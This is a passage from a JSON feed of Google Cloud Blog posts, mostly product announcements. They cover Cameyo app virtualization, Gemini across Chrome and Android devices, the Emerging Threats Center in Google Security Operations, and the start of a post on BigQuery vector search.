baseline;\">.</span></p>\n<p><span style=\"vertical-align: baseline;\">To learn more refer to our </span><a href=\"https://cloud.google.com/bigquery/docs/generative-ai-overview\"><span style=\"text-decoration: underline; vertical-align: baseline;\">documentation</span></a><span style=\"vertical-align: baseline;\">. The </span><span style=\"vertical-align: baseline;\">new managed AI functions are also available in BigQuery DataFrames. See this </span><a href=\"https://github.com/googleapis/python-bigquery-dataframes/blob/main/notebooks/generative_ai/ai_functions.ipynb\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">notebook</span></a><span style=\"vertical-align: baseline;\"> and </span><a href=\"https://cloud.google.com/python/docs/reference/bigframes/latest/bigframes.bigquery._operations.ai#functions\"><span style=\"text-decoration: underline; vertical-align: baseline;\">documentation</span></a><span style=\"vertical-align: baseline;\"> for Python examples.</span></p>\n<p><span style=\"vertical-align: baseline;\">For questions or feedback, reach out to us at </span><a href=\"mailto:bqml-feedback@google.com\"><span style=\"text-decoration: underline; vertical-align: baseline;\">bqml-feedback@google.com</span></a><span style=\"vertical-align: baseline;\">.</span></p></div>",
        "published_date": "2025-11-12 17:00:00"
    },
    {
        "website": "GOOGLE_CLOUD_BLOG",
        "link": "https://cloud.google.com/blog/products/chrome-enterprise/a-flexible-path-to-modern-end-user-computing-with-cameyo-by-google/",
        "title": "A flexible path to modern end-user computing with Cameyo by Google",
        "thumbnail": "https://storage.googleapis.com/gweb-cloudblog-publish/images/25091_Cameyo_Blog_Header_2436x1200_Opt1B_2x.max-600x600.png",
        "author": "Rob Beard",
        "track": null,
        "description": "<div class=\"block-paragraph\"><p>While 90% of IT leaders indicate that the future of their end user computing (EUC) strategy is web-based, those same leaders admit that 50% of the applications their organizations rely on today are still legacy client-based apps.<sup>1</sup> Similarly, IT leaders note that enabling end users to take advantage of AI on the endpoint is their top priority in the next 12 months. Clearly, something needs to bridge the gap between today\u2019s reality and tomorrow\u2019s strategy.</p><h3><b>Announcing Cameyo by Google: Virtual app delivery for the modern tech stack</b></h3><p>To provide today\u2019s organizations with a more modern approach to virtualization, we are thrilled to launch Cameyo by Google, bringing a best-in-class Virtual App Delivery (VAD) solution into the Google enterprise family of products.</p><p>Cameyo is not VDI. It is a modern alternative designed specifically to solve the legacy app gap without the overhead of traditional virtual desktops. Instead of streaming a full, resource-heavy desktop, Cameyo\u2019s Virtual App Delivery (VAD) technology delivers <i>only the applications</i> users need, securely to <i>any</i> device.</p><p>With Cameyo, those legacy Windows or Linux apps can either be streamed in the browser or delivered as Progressive Web Apps (PWAs) to give users the feel of using a native app in its own window. This allows users to run critical legacy applications \u2014 everything from specialized ERP clients, Windows-based design programs like AutoCAD, the desktop version of Excel, and everything in between \u2014 and access them alongside their other modern web apps in the browser, or access them side-by-side with the other apps in their system tray as PWAs. For the user, the experience is seamless and free from the context-switching of managing a separate virtual desktop environment. For IT, the complexity is eliminated.</p><p>\u201cThe beauty of Cameyo is its simplicity. It lets users access applications on any device with security built in, allowing us to reach any end user, on any device, without it ever touching our corporate systems or the complexity or overhead \u2014 no VPNs or firewall configurations needed,\u201d said Phil Paterson, Head of Cloud &amp; Infrastructure, PTSG. He added, \u201cVPNS were taking up to 15 minutes to log in, but with Cameyo access is instant, saving users upwards of 30 minutes every day.\"</p><h3><b>Completing the Google Enterprise stack</b></h3><p>Today\u2019s enterprises have been increasingly turning to Google for a modern, flexible, and secure enterprise tech stack that was built for the web-based future of work, not modified for it. And Cameyo by Google is a critical unlock mechanism that bridges the gap between those organizations\u2019 legacy investments and this modern stack.</p></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"Web-First Future of Work_Cameyo\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/Web-First_Future_of_Work_Cameyo.max-1000x1000.png\" />\n        \n        </a>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph\"><p>Google\u2019s enterprise tech stack provides organizations with a flexible, modular path to modernization. Unlike all-or-nothing enterprise ecosystems, Google\u2019s enterprise stack doesn\u2019t force you to abandon existing investments for the sake of modernization. Instead, it gives you the freedom to modernize individual layers of your stack at your own pace, as it makes sense for your business \u2014 all while maintaining access to your existing technology investments. And Google\u2019s flexible enterprise stack is built for interoperability with a broad ecosystem of modern technologies built for the web, giving you freedom along your modernization journey.</p><h3><b>A secure browsing first: Cameyo + Chrome Enterprise</b></h3><p>Speaking of enabling organizations to modernize at their own rate, we\u2019ve seen a distinct pattern popping up throughout our conversations with enterprises today. And that pattern is the interest in migrating to Secure Enterprise Browsers (SEBs) to provide a more secure, manageable place for people to do their best work.</p><p>And while the market for SEBs is growing rapidly, most enterprise browser solutions share a fundamental blind spot: they are only built to secure <i>web-based</i> SaaS applications. They have no direct answer for the 50% of client-based applications that run entirely outside the browser.<sup>1</sup></p><p>This is where the combination of Cameyo by Google and Chrome Enterprise Premium provides a unique solution. This combination is the <i>only solution on the market</i> that delivers and secures <i>both</i> modern web apps and legacy client-based apps within a single, unified browser experience.</p><p>Here\u2019s how it works:</p><ol><li><b>Chrome Enterprise Premium</b> serves as the secure entry point, providing advanced threat protection, URL filtering, and granular Data Loss Prevention (DLP) controls - like preventing copy/paste or printing - for all sensitive data and web activity.</li><li><b>Cameyo</b> takes your legacy client apps (like your ERP, an internal accounting program, SAP client, etc.) and publishes it within that managed Chrome Enterprise browser.</li><li><b>This unifies the digital workspace.</b> Those legacy applications, which previously lived on a desktop, now run under the single security context of the secure browser. This allows Chrome Enterprise Premium's advanced security and DLP controls to govern applications they previously couldn't see, providing a comprehensive security posture across all of your organization\u2019s apps, not just the web-based apps.</li><li><b>Bringing AI to legacy apps.</b> The combination of Cameyo and Chrome Enterprise not only brings all your apps into a secure enterprise browser, but thanks to Gemini in Chrome, all of your legacy apps now have the power of AI layered on top.</li></ol><h3><b>Unlocking adoption of a more secure, web-based OS and more collaborative, web-first productivity</b></h3><p>Moving all of your apps to the web with Cameyo doesn\u2019t just provide a more unified user experience. It can also provide a significantly better, more flexible, and more secure experience for IT. Compared to traditional virtualization technologies that take weeks or months to deploy, IT can publish their first apps to users within hours, and be fully deployed in days. All while taking advantage of Cameyo\u2019s embedded Zero Trust security model for ultra-secure app delivery.</p><p>And that added simplicity, flexibility, and security opens up other opportunities for IT, too.</p><p>For organizations that have been looking for a more secure alternative to Windows in the wake of years of security incidents, outages, and forced upgrades to the next Windows version, Cameyo now makes it possible for IT to migrate to ChromeOS \u2014 including the use of ChromeOS Flex to convert existing PCs to ChromeOS \u2014 while maintaining access to all of their Windows apps.</p><p>For years, the primary blocker for deeper enterprise adoption of ChromeOS has always been the \"app gap\" \u2014 the persistent need to access a few remaining Windows applications within an organization. Cameyo eliminates this blocker entirely, enabling organizations to confidently migrate their entire fleet to ChromeOS, the only operating system with zero reported ransomware attacks, ever.</p><p>Similarly, Cameyo allows organizations to fully embrace Google Workspace while retaining access to essential client apps that previously kept them tethered to Microsoft\u2122, such as legacy Excel versions with complex macros or specific ERP clients. Now, teams can move to a more modern, collaborative productivity suite that was built for the web, and they can still access any specialized Windows apps that their workflows still depend on.</p><h3><b>Your flexible path to modernization starts now</b></h3><p>For too long, legacy applications have hindered organizations\u2019 modernization efforts. But the age of tolerating complex, costly virtualization solutions just to keep legacy apps alive is coming to an end.</p><p>Cameyo by Google, like the rest of the Google enterprise stack, was built in the cloud specifically to enable the web-based future of work. And like the rest of Google\u2019s enterprise offerings, Cameyo gives you a flexible path forward that enables you to build a modern, secure, and productive enterprise computing stack at the pace that works for you.</p><p>So, together \u2014 let\u2019s get to work.</p><p></p><p><sup>1</sup> <a href=\"https://services.google.com/fh/files/blogs/google_forrester_report_2024.pdf\" target=\"_blank\">Forrester Consulting: A commissioned study conducted by Forrester Consulting on behalf of Google, Deliver a Next-Generation Endpoint, 2024</a></p></div>",
        "published_date": "2025-11-12 17:00:00"
    },
    {
        "website": "GOOGLE_CLOUD_BLOG",
        "link": "https://cloud.google.com/blog/products/chrome-enterprise/bringing-connected-work-experiences-across-our-platforms-and-devices/",
        "title": "Bringing connected and AI-powered work experiences across our platforms and devices",
        "thumbnail": "https://storage.googleapis.com/gweb-cloudblog-publish/images/CE_Chrome_summit_blog_header_v3.max-600x600.png",
        "author": "Bryan Lee",
        "track": null,
        "description": "<div class=\"block-paragraph\"><p>The way we work is rapidly transforming, and AI is quickly becoming a connection point across workflows and tasks both big and small. Whether it\u2019s saving time by converting automated meeting notes into a follow-up email to a client, or getting help with brainstorming your next big campaign idea, Generative AI, driven by models like Gemini, offers seamless, intelligent help for employees. Google is able to bring the power of AI seamlessly into every work surface, from the browser, to the operating system to core work applications, across an expanding collection of new devices.</p></div>\n<div class=\"block-video\">\n\n\n\n<div class=\"article-module article-video \">\n  <figure>\n    <a class=\"h-c-video h-c-video--marquee\" href=\"https://youtube.com/watch?v=q0r-Azc9h-M\">\n\n      \n        <img alt=\"Chrome Summit video\" src=\"https://img.youtube.com/vi/q0r-Azc9h-M/maxresdefault.jpg\" />\n      \n      <svg class=\"h-c-video__play h-c-icon h-c-icon--color-white\" xmlns=\"http://www.w3.org/2000/svg\">\n        <use xlink:href=\"#mi-youtube-icon\" xmlns:xlink=\"http://www.w3.org/1999/xlink\"></use>\n      </svg>\n    </a>\n\n    \n  </figure>\n</div>\n\n<div class=\"h-c-modal--video\">\n   <a class=\"glue-yt-video\" href=\"https://youtube.com/watch?v=q0r-Azc9h-M\">\n   </a>\n</div>\n\n</div>\n<div class=\"block-paragraph\"><p>So how does this come to life for our customers? Our platforms like Chrome Enterprise, the most trusted enterprise browser, and Android, the flexible OS that powers mobile and beyond, have hundreds of millions of business users relying on these technologies at work, and AI continues to make them more helpful for the workforce.</p><p>Hardware like Google Pixel and Chromebook Plus devices are infused with AI, built for these new AI experiences, and are already growing in adoption among businesses. But it doesn\u2019t stop there. We\u2019re also expanding to new surfaces with Android XR, the extended reality operating system for next-gen headsets and smart glasses. And <a href=\"https://beam.google/\" target=\"_blank\">Google Beam</a>, our AI-first video communication platform is redefining how we connect.</p><p>Together, Google\u2019s enterprise platforms and devices build for the connected future.</p></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"Horizon Hall Keynote 2025 (3)\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/Horizon_Hall_Keynote_2025_3.max-1000x1000.png\" />\n        \n        </a>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph\"><p>Let\u2019s look at how this comes together with recent and exciting new capabilities for enterprises:</p><p><b>Empowering your employees to work smarter and be more productive</b></p><p>Across our platforms and devices, we\u2019re offering familiar user experiences, so employees get the right apps and information they need. Whether that\u2019s Google\u2019s productivity apps, third party SaaS apps, custom apps or even legacy apps. And we make sure that help from Gemini is just a tap, click or prompt away.</p><p>To help organizations continue to move towards a more modern endpoint computing experience, we\u2019re excited to announce the <a href=\"https://cloud.google.com/blog/products/chrome-enterprise/a-flexible-path-to-modern-end-user-computing-with-cameyo-by-google\">general availability of Cameyo by Google</a>, allowing users to run any application, legacy or modern, side-by-side. Built in the cloud as part of the Google enterprise stack, Cameyo delivers a seamless, web-based experience for users and eliminates complexity for IT.</p><p>We recently announced Gemini in Chrome, <a href=\"https://cloud.google.com/blog/products/chrome-enterprise/supercharging-employee-productivity-with-ai-securely-with-gemini-in-chrome-enterprise?e=48754805\">an AI browsing assistant that enables end users to work more efficiently</a>. It can be used to quickly summarize long reports or documents, grab key information from a video or brainstorm ideas for a new project. Gemini in Chrome can understand the context of a user\u2019s tabs, and recall recent tabs they had open. By combining Gemini in Chrome with an app virtualized by Cameyo, organizations can bring the helpfulness of AI to legacy apps on the web.</p><p>Gemini in Chrome is available with enterprise grade protections to Google Workspace customers giving IT and security teams control over how their users use AI. These capabilities are rolling out to Android, iOS, Mac, and Windows users already. We're excited to announce that in addition to the built-in Gemini capabilities on ChromeOS, these Gemini in Chrome capabilities will also be available to Workspace customers on their Chromebook Plus devices soon.</p><p><b>Endpoints for a new work era</b></p><p>Organizations need devices that are purpose-built for the AI era, with powerful hardware and AI integrations directly in the operating system. Google is integrating Gemini and Google AI across a wide set of devices and form factors to deliver a consistent experience, wherever work happens.</p><p>Chromebook Plus provides a line of devices designed with more powerful hardware to deliver AI-powered experiences at a great value. This year, we launched new features like Text capture and Select to search with Lens. We also launched two new devices, the Lenovo Chromebook Plus 14\u201d and the Acer Chromebook Plus Spin 514 equipped with Mediatek NPU processors delivering up to 50 TOPS. We will continue to bring powerful laptop experiences to support the needs of workers today and into the future.</p><p>Similarly, employees need the flexibility to be productive, especially on the go. Google Pixel uses on-device AI through Gemini Nano to enable features such as offline summarization in the Recorder app,<sup>1</sup> Call Notes,<sup>2</sup> Magic Cue,<sup>3</sup> Live Translate (Voice)<sup>4</sup> and more. Additionally, features like Gemini Live<sup>5</sup> with screen sharing and camera sharing help bring new levels of productivity to users on the go.<br /></p><p>We\u2019re also starting to see new emerging form factors like extended reality (XR) as ways to extend our workplace. The <a href=\"https://www.android.com/xr/\" target=\"_blank\">introduction of Android XR</a> marks a major shift for the modern enterprise, extending the reach of contextual AI beyond mobile devices and into the physical workspace. This platform, running on a new ecosystem of headsets and smart glasses, integrates Gemini to provide a true hands-free, contextual assistant. For employees in fields like field service, manufacturing, healthcare, or logistics, this means real-time, heads-up support overlayed onto their view of the world. For example, a technician could receive step-by-step repair instructions or access complex schematics on an optional in-lens display while keeping both hands on the equipment.</p><p><b>Improving security controls and visibility</b></p><p>For IT teams, we know there is a need larger than ever for more visibility and protections. We\u2019re delivering security intelligence and flexible management to AI-powered end user computing environments.</p></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"Horizon Hall Keynote 2025 (2)\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/Horizon_Hall_Keynote_2025_2.max-1000x1000.png\" />\n        \n        </a>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph\"><p>Comprehensive data protection at the browser and OS level is crucial for navigating today\u2019s evolving threat landscape, especially with the rise of AI services. To deliver this essential protection where work primarily happens, within the browser, we\u2019ve embedded robust data loss prevention directly into <a href=\"https://chromeenterprise.google/products/chrome-enterprise-premium/?utm_source=adwords&amp;utm_medium=cpc&amp;utm_campaign=2025-h2-premium-chromebrowser-paidmed-paiddisplay-other-chromebrowserent&amp;utm_term=chrome-enterprise-premium&amp;utm_content=GCPM&amp;brand=GCPM&amp;gclsrc=aw.ds&amp;gad_source=1&amp;gad_campaignid=19746200608&amp;gbraid=0AAAAADJomweJdvprFyk0La6Nh_fStfUlQ&amp;gclid=Cj0KCQiAq7HIBhDoARIsAOATDxAdnpTB3ppahmwpErAn3M8VW04KA8-l2-vbniw5Yk9VY1PCIwYvYPYaAjW5EALw_wcB#windows-tab\" target=\"_blank\">Chrome Enterprise Premium</a>. This provides IT and security teams with an extensive, easily configurable set of tools in Chrome to proactively guard against accidental or intentional data loss across all web applications.</p><p>We\u2019ve expanded many of the data loss prevention capabilities to mobile platforms as well. Admins now can:</p><ul><li>Audit, warn or block access to sites or categories of sites on iOS or Android</li><li>Set limitations on copying and pasting sensitive data in mobile</li><li>Restrict downloads including when users are in Incognito mode</li><li>Provision client certificates to Chrome managed profiles on Android, this capability is coming to iOS soon</li></ul><p>Organizations leveraging Google\u2019s security ecosystem can now benefit from a new one-click integration with Google SecOps. This integration delivers unprecedented browser intelligence, including data loss events and risky activity, to SecOps, empowering security teams to conduct more thorough investigations and make faster, better-informed decisions.</p><p>The rapid rise of Generative AI, powered by Gemini, fundamentally changes what we expect from our enterprise technology, offering seamless, intelligent assistance across every workflow. Google is committed to delivering a unified vision, ensuring this help is immediately available by empowering your employees across every surface\u2014from Chrome and Android to web applications virtualized by Cameyo by Google. By creating endpoints built for the AI era like Chromebook Plus and extending the workplace with Android XR, we ensure powerful hardware and AI integrations go hand-in-hand. <a href=\"http://chromeenterprise.google/products/enterprise-platforms\" target=\"_blank\">Discover</a> how you can equip your teams for the future with Chrome Enterprise, ChromeOS, and Cameyo.</p></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"Google&#x27;s enterprise platforms and devices ecosystem\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/image_1_DPbJBgK.max-1000x1000.png\" />\n        \n        </a>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph\"><p><sup>1</sup> <sub>Available on select devices, languages, and countries. Works with compatible accounts and some features may not be available based on corporate account settings. Check responses for accuracy.</sub></p><p><sup>2</sup> <sub>Available in select countries and languages. Available to 18+ users. Availability may vary by account and profile type.</sub></p><p><sup>3</sup> <sub>Works on calls at least 30 seconds long. Not available in all languages or countries. Requires compatible Pixel phone. See here for more details.</sub></p><p><sup>4</sup> <sub>Results may vary. Check responses for accuracy. Available in select countries and languages.</sub></p><p><sup>5</sup><sub> Results for illustrative purposes and may vary. Check responses for accuracy. Compatible with certain features and accounts. Internet connection required. Available in select countries, languages, and to users 18</sub><sub><sup>+</sup></sub><sub>. Availability may vary by account and profile type.</sub></p></div>",
        "published_date": "2025-11-12 17:00:00"
    },
    {
        "website": "GOOGLE_CLOUD_BLOG",
        "link": "https://cloud.google.com/blog/products/identity-security/introducing-the-emerging-threats-center-in-google-security-operations/",
        "title": "Introducing the Emerging Threats Center in Google Security Operations",
        "thumbnail": null,
        "author": "Nolan Karpinski",
        "track": null,
        "description": "<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">When</span><span style=\"vertical-align: baseline;\"> a</span><span style=\"vertical-align: baseline;\"> major vulnerability makes headlines, CISOs want to know fast if their organization is impacted and prepared. Getting the correct answer is often a time-consuming and human-intensive process that can take days or weeks, leaving open a dangerous window of unknown exposure.</span></p>\n<p><span style=\"vertical-align: baseline;\">To help close that gap, today we\u2019re introducing the </span><strong style=\"vertical-align: baseline;\">Emerging Threats Center</strong><span style=\"vertical-align: baseline;\"> in Google Security Operations. Available today for licensed customers in Google Security Operations, this new capability can help solve the core, practical problem of scaling detection engineering, and help transform how teams operationalize threat intelligence.\u00a0</span></p>\n<p><span style=\"vertical-align: baseline;\">Enabled by Gemini, our detection-engineering agent responds to new threat campaigns detected by Google Threat Intelligence, and includes frontline insights from Mandiant, VirusTotal, and across Google. It generates representative events, assessing coverage, and closing detection gaps.\u00a0</span></p>\n<p><span style=\"vertical-align: baseline;\">The Emerging Threats Center can help you understand if you are impacted by critical threat campaigns, and provides detection coverage to help ensure you are protected going forward.\u00a0</span></p>\n<h3><strong style=\"vertical-align: baseline;\">Introducing campaign-based prioritization with emerging threats</strong></h3>\n<p><span style=\"vertical-align: baseline;\">Protecting against new threats has long been a manual, reactive cycle. It begins with threat analysts pouring over reports to identify new campaign activity, which they then translate into indicators of compromise (IoCs) for detection engineers. Next, the engineering team manually authors, tests, and deploys the new detections.\u00a0</span></p>\n<p><span style=\"vertical-align: baseline;\">Too often, we hear from customers and security operations teams that this labor-intensive process leaves organizations swimming upstream. It was \u201chard to derive clear action from threat intelligence data,\u201d according to 59% of IT and cybersecurity leaders surveyed in this year\u2019s </span><a href=\"https://cloud.google.com/blog/products/identity-security/too-many-threats-too-much-data-new-survey-heres-how-to-fix-that\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Threat Intelligence Benchmark</span></a><span style=\"vertical-align: baseline;\">, a commissioned study conducted by Forrester Consulting on behalf of Google Cloud.</span></p>\n<p><span style=\"vertical-align: baseline;\">By sifting through volumes of threat intelligence data, the Emerging Threats Center can help security surface the most relevant threat campaigns to an organization \u2014 and take proactive action against them.</span></p>\n<p><span style=\"vertical-align: baseline;\">Instead of starting in a traditional alert queue, analysts now have a single view of threats that pose the greatest risks to their specific environment. This view includes details on the presence of IOCs in event data and detection rules.\u00a0</span></p>\n<p><span style=\"vertical-align: baseline;\">For example, when a new zero-day vulnerability emerges, analysts don't have to manually cross-reference blog posts with their alert queue. They can immediately see the campaign, the IOCs already contextualized against their own environment, and the specific detection rules to apply. This holistic approach can help them proactively hunt for the most time-sensitive threats before a major breach occurs.</span></p>\n<p><span style=\"vertical-align: baseline;\">Making all this possible is Gemini in Security Operations, transforming how we engineer detections. By ingesting a continuous stream of frontline threat intelligence, it can automatically test our detection corpus against new threats. When a gap is found, Gemini generates a new, fully-vetted detection rule for an analyst to approve. This systematic, automated workflow can help ensure you are protected from the latest threats.</span></p>\n<h3><strong style=\"vertical-align: baseline;\">Understanding exposure, detailing defensive posture</strong></h3>\n<p><span style=\"vertical-align: baseline;\">Our campaign-based approach can provide definitive answers to the two most critical questions a security team faces during a major threat event: How are we affected, and how well are we prepared.</span></p>\n<p><strong style=\"vertical-align: baseline;\">How are we affected?</strong></p>\n<p><span style=\"vertical-align: baseline;\">The first priority is to understand your exposure. The Emerging Threats Center can help you find active and past threats in your environment by correlating campaign intelligence against your data in two ways:</span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">IOC matches</strong><span style=\"vertical-align: baseline;\">: It automatically searches for and prioritizes campaign-related IoCs across the previous 12 months of your security telemetry.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Detection matches</strong><span style=\"vertical-align: baseline;\">: It instantly surfaces hits from curated detection rules that have been mapped directly to the specific threat campaign.</span></p>\n</li>\n</ul>\n<p><span style=\"vertical-align: baseline;\">Both matches provide a definitive starting point for your investigative workflow.</span></p></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"1\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/1_juILeXg.max-1000x1000.png\" />\n        \n        </a>\n      \n        <figcaption class=\"article-image__caption \"><p>Emerging Threat Center Feed View</p></figcaption>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><p><strong style=\"vertical-align: baseline;\">How are we prepared?</strong></p>\n<p><span style=\"vertical-align: baseline;\">The Emerging Threat Center can also help prove that you are protected moving forward. This capability can provide immediate assurance of your defensive posture by helping you confirm two key facts:</span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">That you have no current or past IOC or detection hits related to the campaign.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">That you have the relevant, campaign-specific detections active and ready to stop malicious activity if it appears.</span></p>\n</li>\n</ul></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"2\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/2_r7ehhhx.max-1000x1000.png\" />\n        \n        </a>\n      \n        <figcaption class=\"article-image__caption \"><p>Emerging Threat Center Campaign Detail View</p></figcaption>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><h3><strong style=\"vertical-align: baseline;\">Under the hood: The detection engineering engine</strong></h3>\n<p><span style=\"vertical-align: baseline;\">The Emerging Threat Center is built on a resilient, automated system that uses Gemini models and AI agents to drastically shorten the detection engineering lifecycle.</span></p></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"2\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/2_od3E6sZ.max-1000x1000.jpg\" />\n        \n        </a>\n      \n        <figcaption class=\"article-image__caption \"><p>Agentic Detection Engineering Workflow</p></figcaption>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">Here\u2019s how it works.</span></p>\n<p><strong style=\"vertical-align: baseline;\">First, it ingests intelligence</strong><span style=\"vertical-align: baseline;\">. The system automatically ingests detection opportunities from Google Threat Intelligence campaigns, which are sourced from Mandiant's frontline incident response engagements, our Managed Defense customers, and Google's unique global visibility. From thousands of raw sample events from adversary activity, Gemini is able to extract a distinct set of detection opportunities associated with the campaign.</span></p>\n<p><strong style=\"vertical-align: baseline;\">Next, it generates synthetic events</strong><span style=\"vertical-align: baseline;\">. We generate high-fidelity anonymized, synthetic event data that accurately mimics adversary tactics, techniques, and procedures (TTPs) described in the intelligence. We use an automated pipeline to generate a corpus of high-fidelity synthetic log events, providing a robust dataset for testing.</span></p>\n<p><strong style=\"vertical-align: baseline;\">Then, it tests coverage</strong><span style=\"vertical-align: baseline;\">. The system uses the synthetic data to test our existing detection rule set, providing a rapid, empirical answer to how well we are covered for a new threat. This automated testing pipeline quickly provides an answer on detection coverage.</span></p>\n<p><strong style=\"vertical-align: baseline;\">After that, it accelerates rule creation</strong><span style=\"vertical-align: baseline;\">. When coverage gaps are found, the process uses Gemini to automatically generate and evaluate new rules. Gemini drafts a new detection rule and provides a summary of its logic and expected performance, reducing the time to create a production-ready rule from days to hours</span><strong style=\"vertical-align: baseline;\">.</strong></p>\n<p><strong style=\"vertical-align: baseline;\">Finally, it requires human review</strong><span style=\"vertical-align: baseline;\">. The new rule is submitted to a human-in-the-loop security analyst who can vet and verify the new rule before deploying it. AI has helped us transform a best-effort, manual process into a systematic, automated workflow. By enabling us to tie new detections directly to the intelligence campaign it covers, we can help you be prepared for the latest threats.</span></p>\n<p><span style=\"vertical-align: baseline;\">\u201cThe real strategic shift is moving past those single indicators to systematically detecting underlying adversary behaviors \u2014 that's how we get ahead and stay ahead. Out-of-box behavioral rules, based on Google's deep intel visibility, help us get there,\u201d said Ron Smalley, senior vice-president and head of Cybersecurity Operations, Fiserv.</span></p>\n<p><span style=\"vertical-align: baseline;\">To dive deeper into the complete framework that powers this, read more about </span><a href=\"https://cloud.google.com/chronicle/docs/detection\"><span style=\"text-decoration: underline; vertical-align: baseline;\">our applied threat intelligence</span></a><span style=\"vertical-align: baseline;\"> and watch our </span><a href=\"https://cloudonair.withgoogle.com/events/google-cloud-security-talks-november-2025\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Google Security Talks</span></a><span style=\"vertical-align: baseline;\"> keynote.</span></p></div>",
        "published_date": "2025-11-12 17:00:00"
    },
    {
        "website": "GOOGLE_CLOUD_BLOG",
        "link": "https://cloud.google.com/blog/products/data-analytics/the-story-of-bigquery-vector-search/",
        "title": "BigQuery under the hood: How Google brought embeddings to analytics",
        "thumbnail": null,
        "author": "Joe Malone",
        "track": null,
        "description": "<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">Embeddings are a crucial component at the intersection of data and AI. As data structures, they encode the inherent meaning of the data they represent, and their significance becomes apparent when they are compared to one another. Vector search is a technique that uncovers the relative meaning of those embeddings by evaluating the distances between them within a shared space.\u00a0</span></p>\n<p><span style=\"vertical-align: baseline;\">In early 2024, </span><a href=\"https://cloud.google.com/blog/products/data-analytics/introducing-new-vector-search-capabilities-in-bigquery?e=48754805\"><span style=\"text-decoration: underline; vertical-align: baseline;\">we launched vector search in the BigQuery data platform</span></a><span style=\"vertical-align: baseline;\">, making its powerful capabilities accessible to all BigQuery users. This effectively eliminated the need for specialized databases or complex AI workflows. Our ongoing efforts to democratize vector search has resulted in a unique approach that provides the scale, simplicity, and cost performance that BigQuery users expect. In this article, we reflect on the past two years, sharing insights gained from product development and customer interactions.</span></p>\n<h3><strong style=\"vertical-align: baseline;\">In the before-times: Building vector search the hard way\u00a0</strong></h3>\n<p><span style=\"vertical-align: baseline;\">Before we added native support for vector search in BigQuery, building a scalable vector search solution was a complex, multi-step process. Data professionals had to:</span></p>\n<ol>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Extract data from their data warehouse</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Generate embeddings using specialized machine learning infrastructure</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Load the embeddings into a dedicated vector 